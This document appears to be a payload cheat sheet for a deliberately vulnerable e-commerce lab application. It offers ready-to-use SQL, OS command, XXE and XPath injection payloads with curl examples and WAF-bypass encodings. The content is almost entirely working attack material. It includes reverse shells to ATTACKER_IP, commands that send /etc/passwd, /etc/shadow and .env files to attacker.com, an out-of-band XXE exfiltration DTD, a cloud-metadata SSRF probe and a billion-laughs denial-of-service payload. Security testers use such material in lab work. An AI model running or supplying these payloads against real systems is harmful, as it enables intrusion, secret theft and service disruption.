# Sample Attack Payloads

This document contains ready-to-use payloads for testing each vulnerability.

## 1. SQL Injection Payloads

### Basic Authentication Bypass
```
test' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
admin'--
admin' #
```

### Union-Based Data Extraction
```
# Extract user table
x' UNION SELECT id,email,password,first_name,last_name,phone,role,created_at FROM users--

# Extract table names
x' UNION SELECT table_name,2,3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema='ecommerce_db'--

# Extract column names
x' UNION SELECT column_name,2,3,4,5,6,7,8 FROM information_schema.columns WHERE table_name='users'--

# Extract database version
x' UNION SELECT VERSION(),2,3,4,5,6,7,8--

# Count users
x' UNION SELECT COUNT(*),2,3,4,5,6,7,8 FROM users--
```

### Boolean-Based Blind SQLi
```
test' AND 1=1--
test' AND 1=2--
test' AND (SELECT COUNT(*) FROM users)>5--
test' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='$'--
```

### Time-Based Blind SQLi
```
test' AND SLEEP(5)--
test' AND IF(1=1, SLEEP(5), 0)--
test' AND (SELECT SLEEP(5) FROM users LIMIT 1)--
```

---

## 2. OS Command Injection Payloads

### Basic Command Execution
```
; whoami
| whoami
& whoami
&& whoami
|| whoami
`whoami`
$(whoami)
```

### File Reading
```
; cat /etc/passwd
| cat /etc/hostname
&& cat /app/.env
; cat /app/package.json
```

### Directory Listing
```
; ls -la /
&& ls -la /tmp
| pwd
```

### Command Chaining
```
; whoami; pwd; ls
test.txt; cat /etc/passwd > /tmp/stolen.txt
log.txt && curl http://attacker.com/exfil?data=$(base64 /etc/passwd)
```

### Reverse Shell (Linux)
```
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
&& nc ATTACKER_IP 4444 -e /bin/bash
| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Data Exfiltration
```
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
&& wget http://attacker.com/exfil --post-file=/app/.env
| nc attacker.com 4444 < /etc/shadow
```

---

## 3. XXE Injection Payloads

### Read Local Files
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<salesReport>
  <reportName>&xxe;</reportName>
  <period>Q1 2024</period>
  <totalSales>50000</totalSales>
</salesReport>
```

### Read Application Files
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/.env">
]>
<salesReport>
  <reportName>&xxe;</reportName>
  <period>Q1</period>
  <totalSales>1000</totalSales>
</salesReport>
```

### SSRF - Internal Network Scan
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:3306">
]>
<salesReport>
  <reportName>&xxe;</reportName>
  <period>Q1</period>
  <totalSales>1000</totalSales>
</salesReport>
```

### SSRF - Cloud Metadata
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<salesReport>
  <reportName>&xxe;</reportName>
  <period>Q1</period>
  <totalSales>1000</totalSales>
</salesReport>
```

### Billion Laughs Attack (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<salesReport>
  <reportName>&lol4;</reportName>
  <period>Q1</period>
  <totalSales>1000</totalSales>
</salesReport>
```

### Out-of-Band Data Exfiltration
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<salesReport>
  <reportName>Test</reportName>
  <period>Q1</period>
  <totalSales>1000</totalSales>
</salesReport>
```

**evil.dtd content:**
```xml
<!ENTITY % payload "<!ENTITY send SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%payload;
```

---

## 4. XPath Injection Payloads

### Authentication Bypass
```
admin' or '1'='1
' or '1'='1
'] | //user | //user[username='
notexist'] | //user | //user[username='
```

### Extract All Users
```
'] | //user | //user[username='
'] | //* | //user[username='
' or 1=1 or '1'='1
admin'] | //user[role='administrator'] | //user[username='
```

### Boolean-Based Blind XPath
```
admin' and count(//user)>5 and '1'='1
admin' and string-length(//user[1]/username)>3 and '1'='1
admin' and //user[1]/role='administrator' and '1'='1
```

### Extract Data Character by Character
```
admin' and substring(//user[username='admin']/apiKey,1,1)='s' and '1'='1
admin' and substring(//user[username='admin']/apiKey,2,1)='k' and '1'='1
admin' and substring(//user[username='admin']/email,1,1)='a' and '1'='1
```

### XPath Functions
```
'] | //user[starts-with(username,'a')] | //user[username='
'] | //user[contains(username,'admin')] | //user[username='
'] | //user[string-length(apiKey)>20] | //user[username='
```

---

## Complete cURL Examples

### SQL Injection
```bash
# Basic bypass
curl "http://localhost:3000/api/products/search?query=test'%20OR%20'1'='1"

# Extract users
curl "http://localhost:3000/api/products/search?query=x'%20UNION%20SELECT%20id,email,password,first_name,last_name,phone,role,created_at%20FROM%20users--"
```

### OS Command Injection #1
```bash
TOKEN="your_admin_token"

# Whoami
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=whoami"

# Read passwd
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=cat%20/etc/passwd"

# Multiple commands
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=whoami;pwd;ls%20-la"
```

### OS Command Injection #2
```bash
TOKEN="your_admin_token"

# Simple command
curl -X POST http://localhost:3000/api/admin/export-logs \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "logs.txt; whoami"}'

# Read file
curl -X POST http://localhost:3000/api/admin/export-logs \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "logs.txt; cat /etc/passwd > /tmp/exfil.txt"}'
```

### OS Command Injection #3
```bash
TOKEN="your_admin_token"

# Via backupName
curl -X POST http://localhost:3000/api/admin/backup \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"backupName": "backup; whoami"}'

# Via email
curl -X POST http://localhost:3000/api/admin/backup \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"backupName": "backup", "email": "test@example.com; cat /etc/passwd"}'
```

### XXE Injection #1
```bash
TOKEN="your_admin_token"

# Read /etc/hostname
curl -X POST http://localhost:3000/api/reports/upload-sales \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "xmlData": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><salesReport><reportName>&xxe;</reportName><period>Q1 2024</period><totalSales>50000</totalSales></salesReport>"
  }'

# Read package.json
curl -X POST http://localhost:3000/api/reports/upload-sales \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "xmlData": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/package.json\">]><salesReport><reportName>&xxe;</reportName><period>Q1</period><totalSales>1000</totalSales></salesReport>"
  }'
```

### XXE Injection #2
```bash
TOKEN="your_admin_token"

# Read hostname
curl -X POST http://localhost:3000/api/reports/import-products \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "xmlContent": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><products><product><name>&xxe;</name><description>Test</description><price>99</price><stock>10</stock></product></products>"
  }'
```

### XPath Injection
```bash
TOKEN="your_user_token"

# Get all users
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=admin'%20or%20'1'='1"

# Extract via union-style
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=']%20|%20//user%20|%20//user[username='"

# Boolean-based
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=admin'%20and%20count(//user)>0%20and%20'1'='1"
```

---

## Encoded Payloads (for WAF bypass)

### URL Encoding
```
# SQL Injection
%27%20OR%20%271%27%3D%271
%27%20UNION%20SELECT%20

# Command Injection
%3B%20cat%20%2Fetc%2Fpasswd
%7C%20whoami

# XPath
%27%20or%20%271%27%3D%271
```

### Double URL Encoding
```
# SQL Injection
%2527%2520OR%2520%25271%2527%253D%25271

# Command Injection
%253B%2520cat%2520%252Fetc%252Fpasswd
```

### Unicode Encoding
```
# SQL Injection
\u0027 OR \u00271\u0027=\u00271
```

---

## Testing Workflow

1. **Start with simple payloads** to confirm vulnerability
2. **Escalate to data extraction** once confirmed
3. **Test different encoding methods** for WAF bypass
4. **Document all findings** with screenshots/responses
5. **Verify impact** by checking extracted data
6. **Test remediation** after fixes are applied

## Safety Reminders

⚠️ **Only use these payloads on:**
- Your own applications
- Test environments with explicit permission
- This intentionally vulnerable application

❌ **Never use on:**
- Production systems without authorization
- Third-party applications
- Systems you don't own
- Live user data

Happy (ethical) hacking! 🔒
